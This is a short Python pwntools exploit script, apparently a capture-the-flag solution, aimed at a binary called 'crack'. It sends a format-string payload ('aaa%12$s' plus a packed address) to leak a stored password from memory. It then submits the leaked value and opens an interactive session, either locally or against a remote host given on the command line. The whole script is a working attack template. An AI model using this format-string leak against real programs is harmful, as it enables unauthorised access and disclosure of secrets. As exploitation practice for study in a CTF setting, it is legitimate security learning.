#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./crack",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")


def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    password =0x804a048
    payload ="aaa%12$s"+p32(password)
    con.sendafter("? ",payload)
    con.recvuntil("aaa")
    password = u32(con.recv(4))
    print hex(password)
    con.sendlineafter("password :",str(password))
exploit()
con.interactive()    
